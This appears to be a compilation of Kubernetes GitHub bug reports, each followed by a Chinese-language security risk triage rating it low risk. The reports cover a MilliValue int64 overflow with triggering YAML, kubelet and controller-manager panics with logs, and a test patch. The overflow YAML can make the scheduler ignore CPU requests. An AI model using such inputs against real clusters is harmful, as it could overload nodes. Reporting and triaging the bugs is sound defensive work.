#### What happened?

There is a function called [`MilliValue()`](https://github.com/kubernetes/kubernetes/blob/b5e64567958aae5c2e5befae000d3186384c151b/staging/src/k8s.io/apimachinery/pkg/api/resource/quantity.go#L817C1-L822C1) to represent values in milli units and its comment says "this could **overflow** an int64;  if that's a concern, call `Value()` first to verify the number is small enough." 
```go
// staging/src/k8s.io/apimachinery/pkg/api/resource/quantity.go
// MilliValue returns the value of ceil(q * 1000); this could overflow an int64;
// if that's a concern, call Value() first to verify the number is small enough.
func (q *Quantity) MilliValue() int64 {
	return q.ScaledValue(Milli)
}
```
But actually almost [all call to this function](https://github.com/search?q=repo%3Akubernetes%2Fkubernetes%20MilliValue&type=code) don't verify the number is small enough first.

Here are a few unexpected behaviors caused by this overflow.

#### 1. Pod with extremely large cpu request is treated as with 0 cpu request
**Trigger**: create a pod using the following yaml file, with the cpu resource request is set as a very large quantity.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod
  namespace: default
spec:
  containers:
  - name: test-container
    image: nginx
    resources:
      limits:
        cpu: 16Pi
      requests:
        cpu: 16Pi
# 16Pi = 2^4*2^50 = 2^54, 16Pi * 1000 > 2*63 > 2^63 - 1 = maxInt64, so represent this value in milli unit will cause a overflow
```

**Consequence:** The scheduler will treat this pod with 0 cpu request, so it can be scheduled to any nodes ignoring the node's cpu resource usage. 

**Cause**:  [type.go](https://github.com/kubernetes/kubernetes/blob/a28f14089cfa47ef9c57f9f283e1504a68f616d6/pkg/scheduler/framework/types.go#L854C1-L873C2)
The `noderesource` scheduler plugin uses `SetMaxResource()` to pre-calculate the pod resource request.
```go
// SetMaxResource compares with ResourceList and takes max value for each Resource.
func (r *Resource) SetMaxResource(rl v1.ResourceList) {
	if r == nil {
		return
	}

	for rName, rQuantity := range rl {
		switch rName {
		case v1.ResourceMemory:
			r.Memory = max(r.Memory, rQuantity.Value())
		case v1.ResourceCPU:
->			r.MilliCPU = max(r.MilliCPU, rQuantity.MilliValue())
		case v1.ResourceEphemeralStorage:
			r.EphemeralStorage = max(r.EphemeralStorage, rQuantity.Value())
		default:
			if schedutil.IsScalarResourceName(rName) {
				r.SetScalar(rName, max(r.ScalarResources[rName], rQuantity.Value()))
			}
		}
	}
}
```
1. In `SetMaxResource()`, calling `.MilliValue()` directly on a large `Quantity` without first validating it's small enough will lead to an overflow, causing `rQuantity.MilliValue()` to return a negative number.

2. `SetMaxResource()` iteratively compares the provided value with the existing one and retains the larger value (likely designed to handle cases that a resource is specified multiple times, retain the largest one). 
In this case, the CPU request is specified only once, and the default request value is `0`. 
Therefore, `max(0, negative_number)` returns `0`, resulting in the `noderesource` plugin considers this pod's cpu request is 0.

#### 2. Pod with extremely large memory / ephemeral-storage request will trigger an unexpected warning
**Trigger**: create a pod using the following yaml file, with the ephemeral-storage resource request is a very large quantity.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
spec:
  containers:
  - name: nginx
    image: nginx:latest
    resources:
      requests:
        ephemeral-storage: 9Pi
      limits:
        ephemeral-storage: 9Pi

```
**Consequence:** When creating this pod, 
It's obvious here `9Pi` is an integer, but Kubernetes will output a confusing warning message: `fractional byte value "9Pi" is invalid, must be an integer.`
**Cause**:  [warning.go](https://github.com/kubernetes/kubernetes/blob/175a5b9c4690c63b7d41c3c295402269780b3a27/pkg/api/pod/warnings.go#L237C3-L248C4)
```go
if value, ok := c.Resources.Limits[api.ResourceMemory]; ok && value.MilliValue()%int64(1000) != int64(0) {
    warnings = append(warnings, fmt.Sprintf("%s: fractional byte value %q is invalid, must be an integer", p.Child("resources", "limits").Key(string(api.ResourceMemory)), value.String()))
}
```
Because the quantity is very quite, calling `value.MilliValue()` will overflow and return a value that cannot be modded by 1000, triggers the warning.

#### 3. Node with extremely large allocatable cpu becomes unschedulable.
**Trigger**: create a node using the following yaml file (in [KWOK](https://kwok.sigs.k8s.io/)), with the allocatable cpu resource is a very large quantity.
```yaml
apiVersion: v1
kind: Node
metadata:
  name: node-1
  namespace: default
status:
  allocatable:
    cpu: 1000Pi
  capacity:
    cpu: 1000Pi
```
**Consequence:** The node will be created but the scheduler thinks its allocatable cpu resource is negative, making this node unschedulable to any pod.

**Cause:** [types.go](https://github.com/kubernetes/kubernetes/blob/2caf4eddd8fc1ab7236ed608c1b548404dbc6bcf/pkg/scheduler/framework/types.go#L799C1-L820C2)
```go
// NewResource creates a Resource from ResourceList
func NewResource(rl v1.ResourceList) *Resource {
	r := &Resource{}
	r.Add(rl)
	return r
}

// Add adds ResourceList into Resource.
func (r *Resource) Add(rl v1.ResourceList) {
	if r == nil {
		return
	}

	for rName, rQuant := range rl {
		switch rName {
		case v1.ResourceCPU:
->			r.MilliCPU += rQuant.MilliValue()
		case v1.ResourceMemory:
			r.Memory += rQuant.Value()
		case v1.ResourcePods:
			r.AllowedPodNumber += int(rQuant.Value())
		case v1.ResourceEphemeralStorage:
			r.EphemeralStorage += rQuant.Value()
		default:
			if schedutil.IsScalarResourceName(rName) {
				r.AddScalar(rName, rQuant.Value())
			}
		}
	}
}
```
The call to `MilliValue` at the pointed line will cause an overflow, making the node's CPU resource negative. And `nodereourse` scheduler plugin will conclude this node is ineligible for any pod.


#### What did you expect to happen?

Although it's unlikely that we will encounter these extremely large values in real world, there is no constraint on the range of this value. Therefore we expect no overflow happens regardless of the user's input.

1. Since most calls to `MilliValue()` do not verify that the number is small enough first, we think the simplest fix might be let `MilliValue()` or `ScaledValue()` handle overflow automatically. For example, capping the return value at maxInt64 when overflow occurs.

2. Another possible fix can be to add a range constraint of [MaxMilliValue](https://github.com/kubernetes/kubernetes/blob/847be850000a902bcd82fb4a02bada5d948595a0/staging/src/k8s.io/apimachinery/pkg/api/resource/math.go#L49) for values will be interpreted as milli unit.


#### How can we reproduce it (as minimally and precisely as possible)?

Use the yaml file above.


#### Anything else we need to know?

/sig scheduling api-machinery

#### Kubernetes version

1.31.2

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue指出了Kubernetes在处理资源数量（Quantity）时，当资源请求值非常大时，会导致整数溢出，进而引发调度器的异常行为。例如，创建一个CPU请求值非常大的Pod，可能被调度器认为CPU请求为0，从而调度到任何节点，可能导致节点过载。然而，利用此问题需要攻击者具有创建或修改Pod或节点的权限，即需要具备非只读权限。

根据风险判断标准中的第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在high以下。因此，此问题虽然存在安全风险，但风险评级应为低风险。

---

## Issue #128654 kubelet evented panic when use generic pleg relisting 

- Issue 链接：[#128654](https://github.com/kubernetes/kubernetes/issues/128654)

### Issue 内容

#### What happened?

kubelet evented panic when use generic pleg relisting，the log is like:
```
Oct 21 06:03:47  kubelet[1530]: E1021 06:03:47.241522    1530 remote_runtime.go:550] "ListContainers with filter from runtime service failed" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" filter="&ContainerFilter{Id:,State:nil,PodSandboxId:,LabelSelector:map[string]string{},}"
Oct 21 06:03:48  kubelet[1530]: E1021 06:03:48.844680    1530 remote_runtime.go:550] "ListContainers with filter from runtime service failed" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" filter="&ContainerFilter{Id:,State:nil,PodSandboxId:,LabelSelector:map[string]string{},}"
Oct 21 06:03:48  kubelet[1530]: E1021 06:03:48.844719    1530 resource_metrics.go:118] "Error getting summary for resourceMetric prometheus endpoint" err="failed to list pod stats: failed to list all containers: rpc error: code = DeadlineExceeded desc = context deadline exceeded"
Oct 21 06:03:51  kubelet[1530]: E1021 06:03:51.478833    1530 evented.go:356] "Evented PLEG: Get cache" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" podID=3c55a6f7-4909-4cc8-a48c-c534a6b94304
Oct 21 06:03:53  kubelet[1530]: E1021 06:03:51.580766    1530 runtime.go:78] Observed a panic: "invalid memory address or nil pointer dereference" (runtime error: invalid memory address or nil pointer dereference)
Oct 21 06:03:53  kubelet[1530]: goroutine 369 [running]:
Oct 21 06:03:53  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime.logPanic(0x43ea9e0, 0x77e53c0)
Oct 21 06:03:53  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:74 +0x95
Oct 21 06:03:53  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime.HandleCrash(0x0, 0x0, 0x0)
Oct 21 06:03:53  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:48 +0x86
Oct 21 06:03:53  kubelet[1530]: panic(0x43ea9e0, 0x77e53c0)
Oct 21 06:03:53  kubelet[1530]: /usr/local/go/src/runtime/panic.go:965 +0x1b9
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).updateRunningPodMetric(0xc000a18a00, 0xc0011af950)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:359 +0x7d
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).processCRIEvents(0xc000a18a00, 0xc0010ba840)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:251 +0x3b2
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel(0xc000a18a00)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:206 +0xec
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0xc00181e0a0)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:155 +0x5f
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00181e0a0, 0x53f5b20, 0xc0014981e0, 0x1, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:156 +0x9b
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc00181e0a0, 0x0, 0x0, 0x1, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +0x98
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.Until(0xc00181e0a0, 0x0, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:90 +0x4d
Oct 21 06:03:54  kubelet[1530]: created by k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).Start
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:124 +0x148
Oct 21 06:04:48  kubelet[1530]: panic: send on closed channel
Oct 21 06:04:48  kubelet[1530]: goroutine 403 [running]:
Oct 21 06:04:49  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/cri/remote.(*remoteRuntimeService).GetContainerEvents(0xc00081ea20, 0xc0010ba840, 0x0, 0x1)
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/cri/remote/remote_runtime.go:1230 +0x198
Oct 21 06:04:49  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel.func1(0xc000a18a00, 0xc0010ba840)
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:195 +0x69
Oct 21 06:04:49  kubelet[1530]: created by k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:180 +0xac
Oct 21 06:04:48  systemd[1]: kubelet.service: main process exited, code=exited, status=2/INVALIDARGUMENT
Oct 21 06:04:48  systemd[1]: Unit kubelet.service entered failed state.
Oct 21 06:04:48  systemd[1]: kubelet.service failed.
```

#### What did you expect to happen?

kubelet not panic

#### How can we reproduce it (as minimally and precisely as possible)?

It's hard to reproduce the rpc call "context deadline exceeded" timeout situation, So I added some codes in kubelet to construct this.
1. add the patch for kubelet
```
 pkg/kubelet/cri/remote/remote_runtime.go       | 8 ++++++++
 pkg/kubelet/kuberuntime/kuberuntime_manager.go | 5 +++++
 2 files changed, 13 insertions(+)

diff --git a/pkg/kubelet/cri/remote/remote_runtime.go b/pkg/kubelet/cri/remote/remote_runtime.go
index 424824467b5..d48d6cffb7a 100644
--- a/pkg/kubelet/cri/remote/remote_runtime.go
+++ b/pkg/kubelet/cri/remote/remote_runtime.go
@@ -1206,6 +1206,7 @@ func (r *remoteRuntimeService) CheckpointContainer(options *runtimeapi.Checkpoin
 	return nil
 }

+var eventErrored bool = false
 func (r *remoteRuntimeService) GetContainerEvents(containerEventsCh chan *runtimeapi.ContainerEventResponse) error {
 	containerEventsStreamingClient, err := r.runtimeClient.GetContainerEvents(context.Background(), &runtimeapi.GetEventsRequest{})
 	if err != nil {
@@ -1227,6 +1228,13 @@ func (r *remoteRuntimeService) GetContainerEvents(containerEventsCh chan *runtim
 			return err
 		}
 		if resp != nil {
+			if !eventErrored {
+				if resp.PodSandboxStatus != nil && resp.PodSandboxStatus.Metadata != nil &&
+					resp.PodSandboxStatus.Metadata.Name == "centos7-pod" {
+					eventErrored = true
+					return errors.New("test error")
+				}
+			}
 			containerEventsCh <- resp
 			klog.V(4).InfoS("container event received", "resp", resp)
 		}
diff --git a/pkg/kubelet/kuberuntime/kuberuntime_manager.go b/pkg/kubelet/kuberuntime/kuberuntime_manager.go
index 1c5e545fa9d..f10263c43ce 100644
--- a/pkg/kubelet/kuberuntime/kuberuntime_manager.go
+++ b/pkg/kubelet/kuberuntime/kuberuntime_manager.go
@@ -1040,6 +1040,7 @@ func (m *kubeGenericRuntimeManager) GeneratePodStatus(event *runtimeapi.Containe
 	}, nil
 }

+var errorGetPod bool = false
 // GetPodStatus retrieves the status of the pod, including the
 // information of all containers in the pod that are visible in Runtime.
 func (m *kubeGenericRuntimeManager) GetPodStatus(uid kubetypes.UID, name, namespace string) (*kubecontainer.PodStatus, error) {
@@ -1073,6 +1074,10 @@ func (m *kubeGenericRuntimeManager) GetPodStatus(uid kubetypes.UID, name, namesp

 	klog.V(4).InfoS("getSandboxIDByPodUID got sandbox IDs for pod", "podSandboxID", podSandboxIDs, "pod", klog.KObj(pod))

+	if pod.Name == "centos7-pod" && errorGetPod == false {
+		errorGetPod = true
+		return nil, errors.New("test2 error")
+	}
 	sandboxStatuses := []*runtimeapi.PodSandboxStatus{}
 	containerStatuses := []*kubecontainer.Status{}
 	timestamp := time.Now()
--
2.39.3 (Apple Git-146)
```
2. create a pod, then the kubelet panic
```

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

kubelet 1.21 with latest evented pleg.


#### Cloud provider

None


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>
 Centos7

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
containerd 1.7
</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
从Issue内容来看，kubelet在使用generic pleg relisting时发生了panic，导致kubelet服务崩溃。日志中显示出现了“invalid memory address or nil pointer dereference”的panic，以及“send on closed channel”的panic。

为了复现这个问题，Issue提交者修改了kubelet的代码，模拟了RPC调用超时的情况，导致kubelet发生panic。

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者需要能够引发kubelet的RPC调用超时，这通常需要对集群网络或kubelet运行环境有较高的控制权限。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：由于需要高权限或特定条件才能触发，且影响范围有限，CVSS评分可能在High以下。

4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：此情况下，攻击者需要一定权限，因此风险评级应降低。

因此，该问题可能导致kubelet进程崩溃，造成拒绝服务（DoS），但由于攻击者需要较高权限或特定条件才能触发，风险评级为低风险。

---

## Issue #128638 kubelet crash: fatal error: concurrent map writes

- Issue 链接：[#128638](https://github.com/kubernetes/kubernetes/issues/128638)

### Issue 内容

#### What happened?

While looking into three failing E2E tests in https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gci-gce-alpha-enabled-default/1854326383216431104 (an AllAlpha job), I found that Kubelet had crashed ([logs](https://storage.googleapis.com/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gci-gce-alpha-enabled-default/1854326383216431104/artifacts/bootstrap-e2e-minion-group-h288/kubelet.log)):

```
Nov 07 01:09:07.338827 bootstrap-e2e-minion-group-h288 kubelet[1937]: fatal error: concurrent map writes
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: goroutine 29497 [running]:
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm/containermap.ContainerMap.Add(...)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/containermap/container_map.go:36
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm/cpumanager.(*manager).AddContainer(0xc0008a5ad0, 0xc002175688, 0xc002d8a780, {0xc002d21ec0, 0x40})
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/cpumanager/cpu_manager.go:276 +0x165
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm.(*internalContainerLifecycleImpl).PreStartContainer(0xc000a2a060, 0xc002175688, 0xc002d8a780, {0xc002d21ec0, 0x40})
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/internal_container_lifecycle.go:42 +0x42
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).startContainer(0xc0009c4180, {0x334ff38, 0xc001184050}, {0xc0017ab600, 0x40}, 0xc000323420, 0xc0026aad58, 0xc002175688, 0xc002856c60, {0x4de4ae0, ...}, ...)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_container.go:271 +0xcdb
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).SyncPod.func1({0x334ff38, 0xc001184050}, {0x2e91ac3, 0x9}, {0x2e91ac3, 0x9}, 0xc0026aad58)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_manager.go:1249 +0x8c7
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).SyncPod(0xc0009c4180, {0x334ff38, 0xc001184050}, 0xc002175688, 0xc002856c60, {0x4de4ae0, 0x0, 0x0}, 0xc00095f220)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_manager.go:1318 +0x37d9
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).SyncPod(0xc000431008, {0x334ff00, 0xc001133860}, 0x2, 0xc002175688, 0x0, 0xc002856c60)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kubelet.go:2000 +0x1923
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop.func1({0x0, {0x2, {0xc1c322abaa0c010a, 0x7267b7d9ca, 0x4dc1f60}, 0xc002175688, 0x0, 0x0, 0x0}}, 0xc000ad6960, ...)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:1286 +0x1ca
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000ad6960, {0xc000e53bc0, 0x24}, 0xc002574150)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:1291 +0x49b
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 250
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
```

#### What did you expect to happen?

No crash.

#### How can we reproduce it (as minimally and precisely as possible)?

Don't know, but we have logs from a prow job that encountered it. It's possible that this crash requires a particular alpha feature gate, since this was an AllAlpha job.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
```
v1.32.0-beta.0.205+4c487b00afb20b
```
</details>

#### Cloud provider

<details>
GCE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
从Issue的内容来看，kubelet在处理过程中发生了崩溃，错误信息是“fatal error: concurrent map writes”。这表示在并发情况下对map进行了写操作，导致了Go语言的运行时错误。

这种崩溃可能导致拒绝服务（DoS）攻击。如果攻击者能够通过特定手段触发kubelet的这个并发写入错误，可能导致kubelet服务崩溃，从而影响节点上的容器管理和调度功能。

然而，攻击者要利用此漏洞，需要具备一定的权限，例如能够创建特殊配置的Pod或容器。这意味着攻击者需要具备创建或修改资源的权限。根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在high以下。

因此，该Issue存在安全风险，但风险评级在high以下，判断为低风险。

---

## Issue #128588 KCM crash when running e2e test LoadBalancers case: "should only target nodes with endpoints"

- Issue 链接：[#128588](https://github.com/kubernetes/kubernetes/issues/128588)

### Issue 内容

#### What happened?

When running e2e test on k8s 1.31.1 for the test case:
[sig-network] LoadBalancers ExternalTrafficPolicy: Local [Feature:LoadBalancer] [Slow] [It] should only target nodes with endpoints [sig-network, Feature:LoadBalancer, Slow]

kube-contoller-manager crashed with:
....
I1105 20:54:21.133161      11 replica_set.go:679] "Finished syncing" logger="replicationcontroller-controller" kind="ReplicationController" key="esipp-3418/external-loc                 al-nodes" duration="31.539µs"
E1105 20:54:53.040025      11 panic.go:261] "Observed a panic" panic="runtime error: invalid memory address or nil pointer dereference" panicGoValue="\"invalid memory address or nil pointer dereference\"" stacktrace=<
        goroutine 8578 [running]:
        k8s.io/apimachinery/pkg/util/runtime.logPanic({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
        k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0}, {0x5545b40, 0x0, 0x43d945?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
        k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc0018568c0?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
        panic({0x2d99040?, 0x54807d0?})
                runtime/panic.go:770 +0x132
        k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c1d450, 0xc001a7b188, 0xc002a0ec88)
                k8s.io/cloud-provider/controllers/service/controller.go:562 +0x728
        k8s.io/cloud-provider/controllers/service.New.func2({0x326c9a0?, 0xc001a7b188?}, {0x326c9a0, 0xc002a0ec88?})
                k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
        k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
                k8s.io/client-go/tools/cache/controller.go:253
        k8s.io/client-go/tools/cache.(*processorListener).run.func1()
                k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc001879f70, {0x380e8a0, 0xc001727bc0}, 0x1, 0xc000d8a0c0)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
        k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001879f70, 0x3b9aca00, 0x0, 0x1, 0xc000d8a0c0)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
        k8s.io/apimachinery/pkg/util/wait.Until(...)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:161
        k8s.io/client-go/tools/cache.(*processorListener).run(0xc000e41d40)
                k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
        k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
                k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
        created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 8473
                k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
 >
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0x211c928]

goroutine 8578 [running]:
k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0}, {0x5545b40, 0x0, 0x43d945?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:89 +0xee
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc0018568c0?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
panic({0x2d99040?, 0x54807d0?})
        runtime/panic.go:770 +0x132
k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c1d450, 0xc001a7b188, 0xc002a0ec88)
        k8s.io/cloud-provider/controllers/service/controller.go:562 +0x728
k8s.io/cloud-provider/controllers/service.New.func2({0x326c9a0?, 0xc001a7b188?}, {0x326c9a0, 0xc002a0ec88?})
        k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
        k8s.io/client-go/tools/cache/controller.go:253
k8s.io/client-go/tools/cache.(*processorListener).run.func1()
        k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc0018bbf70, {0x380e8a0, 0xc001727bc0}, 0x1, 0xc000d8a0c0)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
